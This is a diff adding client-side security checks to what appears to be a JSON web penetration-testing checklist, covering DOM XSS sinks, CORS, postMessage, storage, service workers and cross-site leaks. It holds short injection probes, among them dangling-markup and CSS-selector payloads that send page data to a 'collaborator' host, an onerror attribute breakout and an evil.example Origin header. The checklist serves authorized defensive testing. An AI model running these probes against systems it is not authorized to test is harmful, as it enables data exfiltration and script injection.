@@ -247,6 +247,767 @@
           ]
         }
       ]
+    },
+    {
+      "id": "dom-and-injection",
+      "title": "DOM sinks and client-side injection",
+      "checks": [
+        {
+          "id": "source-sink-map",
+          "title": "DOM sources traced into dangerous sinks",
+          "item": "WAPT-CLIENT-001",
+          "severity": "high",
+          "why": "DOM XSS lives where untrusted sources (URL, postMessage, storage) reach sinks (innerHTML, eval, event handlers) — map before exploiting.",
+          "validate": "Every source-to-sink path is enumerated; each ends in safe rendering or is a finding with a reproduction.",
+          "variants": [
+            {
+              "name": "Sink inventory",
+              "kind": "note",
+              "payload": "Grep bundles for sinks: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, new Function, setTimeout(string), jQuery $() with html.",
+              "expect": "Sink list mapped to reachable code paths and the sources feeding them.",
+              "category": "technology-specific",
+              "why": "The map is the deliverable; each sink gets a verdict."
+            },
+            {
+              "name": "URL-to-DOM probe",
+              "kind": "note",
+              "payload": "For each reflected parameter and hash fragment, feed a harmless canary marker and watch DOM insertion points.",
+              "expect": "Markers render as text everywhere; any HTML execution is a finding with the exact path.",
+              "category": "browser-context",
+              "why": "Canary markers prove execution without payloads."
+            },
+            {
+              "name": "Sink-reach triage",
+              "kind": "note",
+              "payload": "For each sink, trace backwards to the source; classify reachable vs dead code.",
+              "expect": "Findings only for live paths — dead sinks documented, not inflated.",
+              "category": "baseline",
+              "why": "Precision keeps DOM XSS reports credible."
+            }
+          ]
+        },
+        {
+          "id": "dynamic-eval",
+          "title": "No dynamic evaluation of untrusted strings",
+          "item": "WAPT-CLIENT-002",
+          "severity": "high",
+          "why": "eval/new Function on request-influenced strings is script execution by construction — no sanitizer survives it.",
+          "validate": "No eval-family sink receives untrusted input; legitimate dynamic code comes from static, integrity-protected sources.",
+          "variants": [
+            {
+              "name": "Eval census",
+              "kind": "note",
+              "payload": "Grep bundles for eval(, new Function(, setTimeout/setInterval with string args, and script-tag injection of request text.",
+              "expect": "Each site receives constants only; any taint traced to source is a finding.",
+              "category": "technology-specific",
+              "why": "Few sites, decisive verdicts."
+            },
+            {
+              "name": "JSONP legacy",
+              "kind": "note",
+              "payload": "Look for callback= parameters and script src built from requests.",
+              "expect": "No request-built script sources; JSONP replaced by CORS JSON.",
+              "category": "parameter-variant",
+              "why": "JSONP is eval wearing a callback."
+            },
+            {
+              "name": "Template-string injection",
+              "kind": "note",
+              "payload": "Template literals interpolating URL/storage data into code or html strings.",
+              "expect": "Interpolations render-only; code contexts are constants.",
+              "category": "mutation",
+              "why": "Backticks are the new eval when mixed with innerHTML."
+            }
+          ]
+        },
+        {
+          "id": "html-injection-impact",
+          "title": "Non-script HTML injection assessed for impact",
+          "item": "WAPT-CLIENT-003",
+          "severity": "medium",
+          "why": "Injecting markup without script execution still matters: defacement, credential forms, dangling-markup exfiltration, attribute injection.",
+          "validate": "HTML injection points are assessed for concrete impact (forms, links, style-based exfil, attribute escapes) rather than auto-dismissed.",
+          "variants": [
+            {
+              "name": "Dangling-markup probe",
+              "kind": "note",
+              "payload": "At an HTML injection point, inject an unclosed tag plus <img src=\"https://collaborator/ to capture subsequent page content.",
+              "expect": "No cross-origin capture of following content; injection neutralized or escaped.",
+              "category": "out-of-band",
+              "why": "Exfiltration without script — classic dangling markup."
+            },
+            {
+              "name": "Attribute escape",
+              "kind": "note",
+              "payload": "Inject \" onerror=alert(1) x=\" and event-handler fragments at attribute-reflection points.",
+              "expect": "Quotes and angle brackets escaped contextually; no attribute breakout.",
+              "category": "mutation",
+              "why": "Attribute contexts need their own escaping."
+            },
+            {
+              "name": "Fake-UI injection",
+              "kind": "note",
+              "payload": "Inject a credential-looking form or login banner at a visible injection point.",
+              "expect": "Either neutralized or assessed as UI-redressing impact for the report.",
+              "category": "browser-context",
+              "why": "Impact sometimes is the interface itself."
+            }
+          ]
+        },
+        {
+          "id": "css-injection",
+          "title": "CSS injection and UI redressing constrained",
+          "item": "WAPT-CLIENT-005",
+          "severity": "medium",
+          "why": "Injected CSS can exfiltrate attribute values character-by-character and redress the UI into a trap.",
+          "validate": "No untrusted input reaches style contexts without escaping; UI-critical elements resist overlay attacks.",
+          "variants": [
+            {
+              "name": "Attribute exfil probe",
+              "kind": "note",
+              "payload": "At a style injection point, inject selectors like input[value^=a]{background:url(//collaborator/a)} shapes (own account).",
+              "expect": "No selector-based secret exfiltration; style contexts escaped.",
+              "category": "out-of-band",
+              "why": "CSS is a slow but reliable reader."
+            },
+            {
+              "name": "Overlay redressing",
+              "kind": "note",
+              "payload": "Where input lands in styles, attempt to reposition a login form or button over your own test element.",
+              "expect": "No meaningful redressing; combined with framing assessment.",
+              "category": "browser-context",
+              "why": "Pairs with clickjacking checks."
+            },
+            {
+              "name": "Style sink census",
+              "kind": "note",
+              "payload": "Grep for .style[prop]=, cssText, insertRule, and jQuery .css() fed by request data.",
+              "expect": "Enumerated and escaped; dynamic theming uses safe APIs.",
+              "category": "technology-specific",
+              "why": "The census finds the paths testing confirms."
+            }
+          ]
+        },
+        {
+          "id": "resource-url-manipulation",
+          "title": "Client-side resource URL manipulation prevented",
+          "item": "WAPT-CLIENT-006",
+          "severity": "high",
+          "why": "Script and endpoint URLs chosen from URL parameters load attacker code or point data exfiltration elsewhere.",
+          "validate": "Resource and endpoint URLs come from configuration/allowlists; request data cannot choose script sources or API base URLs.",
+          "variants": [
+            {
+              "name": "Script-src parameter hunt",
+              "kind": "note",
+              "payload": "Look for lazy-loading of scripts whose src includes request data (redirect params, widget URLs, locale).",
+              "expect": "Request data never selects script origins; allowlists only.",
+              "category": "parameter-variant",
+              "why": "Client-side SSRF is code execution."
+            },
+            {
+              "name": "API-base override",
+              "kind": "note",
+              "payload": "Check for ?api= / ?endpoint= style parameters influencing fetch targets; point one at your Collaborator.",
+              "expect": "Base URLs fixed; no request-driven API targets (watch for data reaching your Collaborator).",
+              "category": "out-of-band",
+              "why": "Exfiltration by configuration."
+            },
+            {
+              "name": "Open-redirect-to-script chain",
+              "kind": "note",
+              "payload": "Where open redirects exist, chain them into script-src or OAuth redirect contexts (in-scope only).",
+              "expect": "Redirects cannot feed loader or OAuth contexts — chained impact reported with the redirect.",
+              "category": "protocol-variant",
+              "why": "Redirects are loaders sometimes."
+            }
+          ]
+        },
+        {
+          "id": "cors-credentialed",
+          "title": "CORS enforcement matches real client behavior",
+          "item": "WAPT-CLIENT-007",
+          "severity": "high",
+          "why": "The header says one thing; the client does another — credentialed cross-origin behavior is what attackers actually use.",
+          "validate": "Credential-bearing requests only to intended origins; CORS policy matches observed client behavior; no wildcard+credentials.",
+          "variants": [
+            {
+              "name": "Origin reflection",
+              "kind": "note",
+              "payload": "Send Origin: https://evil.example with credentials on a data endpoint; read ACAO/ACAC.",
+              "expect": "Exact allowlisted origins; no reflection; never * with credentials.",
+              "category": "header-variant",
+              "why": "The API check, run against the app the client actually uses."
+            },
+            {
+              "name": "Client target census",
+              "kind": "note",
+              "payload": "From the browser, log every fetch/XHR target and credentials mode on the authenticated app.",
+              "expect": "All credentialed targets are first-party origins.",
+              "category": "browser-context",
+              "why": "The map of what the page trusts."
+            },
+            {
+              "name": "Subdomain trust probe",
+              "kind": "note",
+              "payload": "Check whether sibling subdomains you control (in scope) are allowed origins.",
+              "expect": "Siblings allowed only with a documented, hardened reason.",
+              "category": "authorization-context",
+              "why": "Sibling trust extends your attack surface to the weakest subdomain."
+            }
+          ]
+        },
+        {
+          "id": "postmessage-targets",
+          "title": "postMessage replies to validated exact origins",
+          "item": "WAPT-CLIENT-010",
+          "severity": "high",
+          "why": "Replying with sensitive data to \"*\" or unvalidated origins hands it to any page that embeds or opens you.",
+          "validate": "Every postMessage send targets an exact validated origin; receives validate origin and shape; no wildcard replies with data.",
+          "variants": [
+            {
+              "name": "Embed-and-listen",
+              "kind": "note",
+              "payload": "Embed the app (or its widget frame) in your test origin; listen for messages it posts.",
+              "expect": "No sensitive payloads arrive at arbitrary parent origins; targets are exact.",
+              "category": "browser-context",
+              "why": "Be the malicious parent, harmlessly."
+            },
+            {
+              "name": "Message-flood probe",
+              "kind": "note",
+              "payload": "Send unexpected message shapes (missing type, wrong types, giant strings) to its listeners.",
+              "expect": "Listeners validate shape and source; no errors leak, no handlers fire dangerously.",
+              "category": "mutation",
+              "why": "Unhandled messages crash into gadgets."
+            },
+            {
+              "name": "Origin-check census",
+              "kind": "note",
+              "payload": "Grep bundles for postMessage( and compare targetOrigin arguments.",
+              "expect": "No \"*\" sends with data; receive handlers check event.origin.",
+              "category": "technology-specific",
+              "why": "Static truth beats runtime luck."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "storage-and-contexts",
+      "title": "Storage, workers, and browsing contexts",
+      "checks": [
+        {
+          "id": "storage-untrusted",
+          "title": "Browser storage treated as untrusted input",
+          "item": "WAPT-CLIENT-012",
+          "severity": "high",
+          "why": "localStorage and cookies are readable/writable by any XSS and by users — parsing them as code or truth is self-inflicted.",
+          "validate": "Storage values are validated, escaped on use, and never influence code paths or security decisions.",
+          "variants": [
+            {
+              "name": "Storage canary tamper",
+              "kind": "note",
+              "payload": "Write canary markup <img src=x onerror=window.__pwn=1> into each stored key; reload and observe rendering.",
+              "expect": "Values render as inert text; no execution from storage-borne markup.",
+              "category": "mutation",
+              "why": "Your own profile field is the honest canary."
+            },
+            {
+              "name": "JSON-shape fuzz",
+              "kind": "note",
+              "payload": "Swap stored JSON for arrays, huge strings, wrong types; reload.",
+              "expect": "Schema-validated with safe errors; no exceptions leaking internals.",
+              "category": "mutation",
+              "why": "Crash-only bugs still leak behavior."
+            },
+            {
+              "name": "Decision-field probe",
+              "kind": "note",
+              "payload": "Flip privilege-ish stored flags (role, isAdmin, plan) and reload.",
+              "expect": "Client decisions cosmetic only; server re-authorizes everything.",
+              "category": "authorization-context",
+              "why": "Storage is the client-side mass-assignment surface."
+            }
+          ]
+        },
+        {
+          "id": "idb-partition",
+          "title": "IndexedDB partitioned by identity and tenant",
+          "item": "WAPT-CLIENT-013",
+          "severity": "high",
+          "why": "A shared client database mixes tenants and accounts — logout/user-switch then reads the previous identity's records.",
+          "validate": "Client databases are namespaced or keyed by identity/tenant; switching clears or separates data.",
+          "variants": [
+            {
+              "name": "Cross-account canary",
+              "kind": "note",
+              "payload": "As account A (tenant 1), create records with a canary; switch to account B (or tenant 2); enumerate databases/records.",
+              "expect": "B sees none of A's records — separate DBs or filtered queries.",
+              "category": "authorization-context",
+              "why": "The client-side tenant boundary."
+            },
+            {
+              "name": "Logout residue",
+              "kind": "note",
+              "payload": "Log out; enumerate IndexedDB again.",
+              "expect": "Per-user data cleared or invalidated; no authed reads possible from stale rows.",
+              "category": "browser-context",
+              "why": "Left-behind rows are tomorrow's leak."
+            },
+            {
+              "name": "Quota-clobber probe",
+              "kind": "note",
+              "payload": "Fill storage toward quota with own records; observe app behavior.",
+              "expect": "Graceful quota errors; no eviction that exposes another context's data.",
+              "category": "browser-context",
+              "why": "Eviction policy is a privacy policy."
+            }
+          ]
+        },
+        {
+          "id": "sw-cache-privacy",
+          "title": "Service-worker caches free of stale private data",
+          "item": "WAPT-CLIENT-015",
+          "severity": "high",
+          "why": "A service worker outliving the session serves authenticated pages to the next user of the machine — and to offline attackers.",
+          "validate": "Caches exclude authenticated/private responses; logout invalidates caches; worker updates cannot serve stale authority.",
+          "variants": [
+            {
+              "name": "Cache inventory",
+              "kind": "note",
+              "payload": "DevTools → Application → Cache Storage/Service Worker on the authed app; list cached URLs.",
+              "expect": "Private/authenticated responses not cached (or explicitly invalidated).",
+              "category": "browser-context",
+              "why": "The inventory is the finding generator."
+            },
+            {
+              "name": "Logout cache replay",
+              "kind": "note",
+              "payload": "Log out; with the worker active, request a previously cached authenticated page offline/online.",
+              "expect": "Stale authed content never served after logout.",
+              "category": "browser-context",
+              "why": "The next-user scenario, run by you."
+            },
+            {
+              "name": "Update race",
+              "kind": "note",
+              "payload": "Trigger a worker update; check old worker serving during the swap.",
+              "expect": "No window where revoked content is served; versioned caches swapped atomically.",
+              "category": "race-concurrency",
+              "why": "Workers run in the past sometimes."
+            }
+          ]
+        },
+        {
+          "id": "worker-messages",
+          "title": "Worker message boundaries validated",
+          "item": "WAPT-CLIENT-016",
+          "severity": "high",
+          "why": "Workers hold tokens and perform privileged fetches; their message APIs are an unauthenticated input channel when unvalidated.",
+          "validate": "Worker/shared-worker message handlers validate origin, shape, and authorization; no privileged action from bare messages.",
+          "variants": [
+            {
+              "name": "Message-flood probe",
+              "kind": "note",
+              "payload": "postMessage arbitrary shapes, wrong types, and prototype-pollution strings ({__proto__: {...}}) to the worker.",
+              "expect": "Rejected safely; no crash, no gadget, no pollution reaching merges.",
+              "category": "mutation",
+              "why": "Workers get less security attention than windows."
+            },
+            {
+              "name": "Privilege-call probe",
+              "kind": "note",
+              "payload": "Send messages that request privileged operations (token fetch, admin data) directly.",
+              "expect": "Worker authorizes per documented policy; it is a server proxy, not a privilege oracle.",
+              "category": "authorization-context",
+              "why": "The worker is staff; treat its inbox accordingly."
+            },
+            {
+              "name": "SharedWorker cross-context",
+              "kind": "note",
+              "payload": "If SharedWorker connects multiple tabs/contexts, message one context into another (your own tabs).",
+              "expect": "Context isolation maintained; no cross-account message bleed.",
+              "category": "browser-context",
+              "why": "Shared means shared unless partitioned."
+            }
+          ]
+        },
+        {
+          "id": "broadcastchannel",
+          "title": "BroadcastChannel isolated by context",
+          "item": "WAPT-CLIENT-017",
+          "severity": "medium",
+          "why": "Same-origin channels shout to every context — cross-account or cross-tenant tabs receive each other's events.",
+          "validate": "Channels namespaced per app/account context; no sensitive payloads on shared channels.",
+          "variants": [
+            {
+              "name": "Channel census",
+              "kind": "note",
+              "payload": "Grep bundles for new BroadcastChannel( names; map what is posted.",
+              "expect": "Namespaced names; payloads free of tokens and personal data.",
+              "category": "technology-specific",
+              "why": "The census decides the blast radius."
+            },
+            {
+              "name": "Cross-tab canary",
+              "kind": "note",
+              "payload": "With accounts A and B open in two tabs, trigger events as A and listen as B.",
+              "expect": "B receives nothing account-specific; events are context-filtered.",
+              "category": "browser-context",
+              "why": "The multi-account user is the honest test."
+            },
+            {
+              "name": "Eavesdrop on self",
+              "kind": "note",
+              "payload": "From a plain page on the same origin (test page), subscribe to app channels.",
+              "expect": "Nothing sensitive arrives at unauthenticated contexts.",
+              "category": "authorization-context",
+              "why": "Any same-origin page is a subscriber."
+            }
+          ]
+        },
+        {
+          "id": "prototype-gadgets",
+          "title": "Prototype pollution traced to security gadgets",
+          "item": "WAPT-CLIENT-019",
+          "severity": "high",
+          "why": "Pollution alone is a curiosity; pollution reaching gadgets (innerHTML sinks, bypass flags, privilege checks) is exploitation.",
+          "validate": "Every pollutable merge path is mapped to reachable gadgets; each chain is demonstrated or the path is closed.",
+          "variants": [
+            {
+              "name": "Merge-point census",
+              "kind": "note",
+              "payload": "Find recursive/deep merges, query-string-to-object parsers, and JSON paths assigning to __proto__/constructor.prototype.",
+              "expect": "Census of sinks; each validated to reject prototype keys.",
+              "category": "technology-specific",
+              "why": "The map precedes the chain."
+            },
+            {
+              "name": "Gadget chain demo",
+              "kind": "note",
+              "payload": "At a confirmed pollution point, set a canary property consumed by a documented gadget (a config flag you can observe).",
+              "expect": "Chain demonstrated with your own observable; no real user impact.",
+              "category": "mutation",
+              "why": "A chain you can show is a chain they will fix."
+            },
+            {
+              "name": "Payload-key blacklist note",
+              "kind": "note",
+              "payload": "Check libraries for known pollution CVEs and their status.",
+              "expect": "Dependencies patched or mitigated; findings cited with versions.",
+              "category": "baseline",
+              "why": "Known CVEs make the report concrete."
+            }
+          ]
+        },
+        {
+          "id": "dom-clobbering",
+          "title": "DOM clobbering of trusted variables prevented",
+          "item": "WAPT-CLIENT-020",
+          "severity": "medium",
+          "why": "Injected markup with id/name attributes can shadow globals the app trusts (window.config, form.action) — variables lie.",
+          "validate": "Trusted globals cannot be shadowed by DOM ids/names; lookups use safe access patterns.",
+          "variants": [
+            {
+              "name": "Shadow probe",
+              "kind": "note",
+              "payload": "At any HTML injection point, inject <a id=config> / <img name=credentials> style shadows for globals found in the bundle.",
+              "expect": "No shadowing effect on app behavior; lookups resist clobbering.",
+              "category": "mutation",
+              "why": "Named elements become globals — old spec, live bug."
+            },
+            {
+              "name": "Global census",
+              "kind": "note",
+              "payload": "Grep bundles for window.X / bare global reads that intersect with DOM-created globals (document.forms, ids in use).",
+              "expect": "No collisions between DOM names and trusted globals.",
+              "category": "technology-specific",
+              "why": "The intersection list is the risk list."
+            },
+            {
+              "name": "Form-action clobber",
+              "kind": "note",
+              "payload": "Inject a form element clobbering a form reference the submit code uses.",
+              "expect": "Submission targets unaffected; references are explicit.",
+              "category": "browser-context",
+              "why": "Classic clobber-to-CSRF-bypass shape."
+            }
+          ]
+        },
+        {
+          "id": "window-name-hygiene",
+          "title": "window.name cleared across navigation boundaries",
+          "item": "WAPT-CLIENT-021",
+          "severity": "high",
+          "why": "window.name persists across cross-origin navigations — data stashed by one site is read by the next: a free cross-site channel.",
+          "validate": "Nothing security-relevant is stored in window.name; apps reading it validate and clear it on load.",
+          "variants": [
+            {
+              "name": "Persist probe",
+              "kind": "note",
+              "payload": "Set window.name on your test page to a canary; navigate to the app; read window.name there.",
+              "expect": "Empty or inert on arrival; the app clears/ignores it.",
+              "category": "browser-context",
+              "why": "The channel is real; the app decides if it is used."
+            },
+            {
+              "name": "Writer hunt",
+              "kind": "note",
+              "payload": "Grep bundles for window.name assignments.",
+              "expect": "No tokens, redirect targets, or state written to it.",
+              "category": "technology-specific",
+              "why": "If they write it, someone will read it."
+            },
+            {
+              "name": "Cross-tab read",
+              "kind": "note",
+              "payload": "Open the app via window.open from your test page with a set name; observe consumption.",
+              "expect": "Name treated as untrusted input or unused.",
+              "category": "browser-context",
+              "why": "The opener hands you the previous site's note."
+            }
+          ]
+        },
+        {
+          "id": "reverse-tabnabbing",
+          "title": "Reverse tabnabbing from external links",
+          "item": "WAPT-CLIENT-022",
+          "severity": "medium",
+          "why": "External links without noopener hand the foreign page an opener reference to your authenticated tab.",
+          "validate": "All external target=_blank links carry rel=noopener/noreferrer (or COOP covers the surface).",
+          "variants": [
+            {
+              "name": "Link census",
+              "kind": "note",
+              "payload": "Grep rendered DOM for target=_blank without rel=noopener; include user-content-generated links.",
+              "expect": "All external blanks carry noopener; internal ones may use named access deliberately.",
+              "category": "browser-context",
+              "why": "The census is one devtools query."
+            },
+            {
+              "name": "Opener probe",
+              "kind": "note",
+              "payload": "Click an external link to your test page; from there attempt opener.location change.",
+              "expect": "No opener access — cannot touch your app tab.",
+              "category": "browser-context",
+              "why": "The exploit is one line; so is the fix."
+            },
+            {
+              "name": "User-content links",
+              "kind": "note",
+              "payload": "Check links rendered from stored user content (descriptions, comments) for the same flaw.",
+              "expect": "Sanitizer adds noopener to user links.",
+              "category": "mutation",
+              "why": "Sanitizers forget rel more than they forget tags."
+            }
+          ]
+        },
+        {
+          "id": "subresource-integrity",
+          "title": "SRI on stable cross-origin assets",
+          "item": "WAPT-CLIENT-024",
+          "severity": "low",
+          "why": "Pinned third-party scripts with integrity hashes stop a compromised CDN from becoming your XSS.",
+          "validate": "Stable cross-origin scripts/styles carry integrity + crossorigin; only versioned (never latest) URLs are pinned.",
+          "variants": [
+            {
+              "name": "Third-party census",
+              "kind": "note",
+              "payload": "List cross-origin script/style tags; check integrity and crossorigin attributes.",
+              "expect": "Stable assets pinned; un-pinnable (latest-tag) dependencies flagged for the report.",
+              "category": "baseline",
+              "why": "The census decides what is protectable."
+            },
+            {
+              "name": "Version pinning check",
+              "kind": "note",
+              "payload": "Note whether third-party URLs are version-locked or floating (latest).",
+              "expect": "Versioned URLs; floating tags cannot have stable SRI.",
+              "category": "baseline",
+              "why": "Floating + integrity is a contradiction."
+            },
+            {
+              "name": "Tamper self-check",
+              "kind": "note",
+              "payload": "Safely verify: change one hash character in devtools on a test page copy; the asset must refuse to run.",
+              "expect": "Refusal proves enforcement is on.",
+              "category": "browser-context",
+              "why": "Proof the attribute works in this context."
+            }
+          ]
+        },
+        {
+          "id": "xssi-script-inclusion",
+          "title": "Cross-site script inclusion data disclosure",
+          "item": "WAPT-CLIENT-025",
+          "severity": "high",
+          "why": "If authenticated JSON/JS endpoints can be included as scripts, any site reads them via error messages or Array-overrides.",
+          "validate": "Data endpoints are not valid script sources: content-types, prefixed JSON (while(1)), and Array/JSON override protections.",
+          "variants": [
+            {
+              "name": "Script-include probe",
+              "kind": "note",
+              "payload": "From your test origin, <script src=\"https://app.example.com/api/me\"> and observe parse errors in console.",
+              "expect": "No data exposure via error messages; while(1)/prefix blocks parsing; JSON content-type prevents execution.",
+              "category": "browser-context",
+              "why": "The console is the exfil channel."
+            },
+            {
+              "name": "Array-override probe",
+              "kind": "note",
+              "payload": "Predefine Array/Object hooks before including the endpoint as a script.",
+              "expect": "Modern defenses (prefix, content-type) make override tricks inert.",
+              "category": "mutation",
+              "why": "Old trick, still worth one probe."
+            },
+            {
+              "name": "Endpoint census",
+              "kind": "note",
+              "payload": "List endpoints returning JSON without script-hostile prefixes or correct headers.",
+              "expect": "Authenticated data endpoints all defended; list for the report.",
+              "category": "baseline",
+              "why": "Defense belongs on every JSON route."
+            }
+          ]
+        },
+        {
+          "id": "sourcemap-review",
+          "title": "Source maps reviewed without client-code fearmongering",
+          "item": "WAPT-CLIENT-026",
+          "severity": "medium",
+          "why": "Readable client code is not a vulnerability — but sourcemaps sometimes contain secrets, internal URLs, and dead admin code.",
+          "validate": "Public sourcemaps contain no secrets, credentials, internal endpoints, or unreleased feature logic; exposure is a conscious choice.",
+          "variants": [
+            {
+              "name": "Map hunt",
+              "kind": "note",
+              "payload": "Check //# sourceMappingURL= references; fetch maps; search for secret patterns (key, token, password, internal hostnames, .test/.internal URLs).",
+              "expect": "No secrets or internal topology in maps; findings only for real leaks.",
+              "category": "baseline",
+              "why": "Facts over reflexes: code visibility is expected."
+            },
+            {
+              "name": "Dead-privilege code",
+              "kind": "note",
+              "payload": "Scan original sources for admin/debug functions not reachable in the UI.",
+              "expect": "Unreleased functions noted as dark-surface (pairs with API deny-by-default checks).",
+              "category": "technology-specific",
+              "why": "Maps are the roadmap to dark routes."
+            },
+            {
+              "name": "Secret-pattern sweep",
+              "kind": "note",
+              "payload": "Grep original sources for AKIA/sk_/bearer literals and hardcoded endpoints.",
+              "expect": "Zero live secrets; any hit verified harmlessly and reported.",
+              "category": "baseline",
+              "why": "The one true sourcemap vulnerability class."
+            }
+          ]
+        },
+        {
+          "id": "web-crypto-keys",
+          "title": "Web Crypto without exported or hard-coded keys",
+          "item": "WAPT-CLIENT-029",
+          "severity": "high",
+          "why": "Client-held encryption keys protect nothing if exportable, hard-coded, or extractable — and pretend otherwise is worse than nothing.",
+          "validate": "Crypto uses non-extractable Web Crypto keys where possible; no hard-coded secrets; client crypto never treated as trust boundary.",
+          "variants": [
+            {
+              "name": "Key census",
+              "kind": "note",
+              "payload": "Grep for crypto.subtle usage, CryptoKey handling, JWK embeds, and hardcoded key material.",
+              "expect": "Keys generated non-extractable for in-browser use; no embedded JWKs/secrets.",
+              "category": "technology-specific",
+              "why": "Find where crypto actually lives."
+            },
+            {
+              "name": "Extraction probe",
+              "kind": "note",
+              "payload": "At a crypto-using flow (own account), attempt to export the key via subtle.exportKey in console.",
+              "expect": "Non-extractable keys refuse; extractable keys documented with their role.",
+              "category": "browser-context",
+              "why": "The API tells you the design intent."
+            },
+            {
+              "name": "Trust-boundary review",
+              "kind": "note",
+              "payload": "Identify what the client crypto claims to protect; check the server still enforces it.",
+              "expect": "Client crypto is defense-in-depth only; server-side enforcement confirmed.",
+              "category": "baseline",
+              "why": "Honest threat modeling beats client-side safes."
+            }
+          ]
+        },
+        {
+          "id": "xs-leak-channels",
+          "title": "Cross-site leak channels against authenticated state",
+          "item": "WAPT-CLIENT-030",
+          "severity": "medium",
+          "why": "Frame counting, error events, cache timing, and status oracles let other sites ask yes/no questions about your users.",
+          "validate": "Authenticated state does not answer cross-site questions: framing blocked, responses uncacheable where state-dependent, error shapes uniform.",
+          "variants": [
+            {
+              "name": "Frame-count oracle",
+              "kind": "note",
+              "payload": "From your test origin, attempt to frame authed vs unauthed routes and count loads/errors.",
+              "expect": "No differential signal; COOP/frame-ancestors close the channel.",
+              "category": "browser-context",
+              "why": "The simplest XS-Leak is a frame."
+            },
+            {
+              "name": "Resource-timing probe",
+              "kind": "note",
+              "payload": "Measure timing of authed resources cross-origin (your test page, own account).",
+              "expect": "No reliable state-dependent timing signal; Timing-Allow-Origin absent.",
+              "category": "browser-context",
+              "why": "Measure honestly, report deltas with error bars."
+            },
+            {
+              "name": "Error-shape oracle",
+              "kind": "note",
+              "payload": "Cross-site load script/img against endpoints that 403 authed vs 404 unauthed.",
+              "expect": "Uniform status shapes where concealment matters (pairs with existence-oracle checks).",
+              "category": "parser-differential",
+              "why": "Status codes are answers to questions."
+            }
+          ]
+        },
+        {
+          "id": "bfcache-privacy",
+          "title": "Sensitive state and bfcache/session history",
+          "item": "WAPT-CLIENT-031",
+          "severity": "medium",
+          "why": "Back-forward cache and session history resurrect authenticated snapshots after logout — shared machines serve the previous user.",
+          "validate": "Pages with sensitive snapshots handle pageshow/persisted, clear state on unload where needed, and no authed data survives logout.",
+          "variants": [
+            {
+              "name": "BFCache replay",
+              "kind": "note",
+              "payload": "Navigate into an authed page, log out in another tab, then Back; observe the snapshot.",
+              "expect": "Stale authed content not actionable (data blurred, expired, or refetched with re-auth).",
+              "category": "browser-context",
+              "why": "The real user flow: logout then back button."
+            },
+            {
+              "name": "pageshow handler check",
+              "kind": "note",
+              "payload": "Inspect for pageshow/persisted handling in bundles.",
+              "expect": "Deliberate handling exists (refresh or invalidate on persisted).",
+              "category": "technology-specific",
+              "why": "One event decides correctness."
+            },
+            {
+              "name": "History sweep",
+              "kind": "note",
+              "payload": "Check history entries for data-bearing URLs (tokens in fragments) after logout.",
+              "expect": "No credential URLs retained in session history.",
+              "category": "browser-context",
+              "why": "History is storage nobody sweeps."
+            }
+          ]
+        }
+      ]
     }
-  ]
+  ],
+  "lastmod": "2026-08-21"
 }
